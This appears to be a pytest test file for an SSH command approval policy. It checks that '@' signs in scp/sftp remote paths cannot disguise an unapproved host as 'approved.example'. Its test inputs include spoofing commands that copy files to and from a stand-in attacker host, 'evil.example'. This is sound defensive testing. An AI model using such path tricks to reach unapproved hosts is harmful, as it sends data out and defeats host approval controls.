import pytest
from core.inference.ssh_policy import check_ssh_command_access,extract_ssh_hosts_from_command
from state.ssh_approvals import approve_hosts,reset_ssh_approvals

@pytest.mark.parametrize('command',[
 'scp -F none evil.example:/tmp/file@approved.example ./copy',
 'scp -F none ./copy user@evil.example:/tmp/file@approved.example',
 'sftp -F none user@evil.example:/tmp/file@approved.example',
 'scp -F none user@realm@evil.example:path@approved.example ./copy',
 'sftp -F none evil.example:path@approved.example:extra',
 'scp -F none user@[2001:db8::1]:/tmp/file@approved.example ./copy',
])
def test_remote_path_at_sign_cannot_change_approved_host(command):
 reset_ssh_approvals();approve_hosts('review',['approved.example'])
 assert check_ssh_command_access(command,'review') is not None
 host='2001:db8::1' if '[2001' in command else 'evil.example'
 assert extract_ssh_hosts_from_command(command)==({host},False)
 approve_hosts('review',[host]);assert check_ssh_command_access(command,'review') is None

@pytest.mark.parametrize('command',[
 'scp -F none ./file@local user@approved.example:/tmp/file@tag',
 'scp -F none approved.example:/tmp/file ./copy@local',
 'scp -F none scp://user@approved.example/tmp/file@tag ./copy',
 'sftp -F none sftp://user@approved.example/tmp/file@tag',
 'ssh -F none user@realm@approved.example uptime',
])
def test_local_paths_and_uris_keep_the_authority(command):
 reset_ssh_approvals();approve_hosts('review',['approved.example'])
 assert extract_ssh_hosts_from_command(command)==({'approved.example'},False)
 assert check_ssh_command_access(command,'review') is None
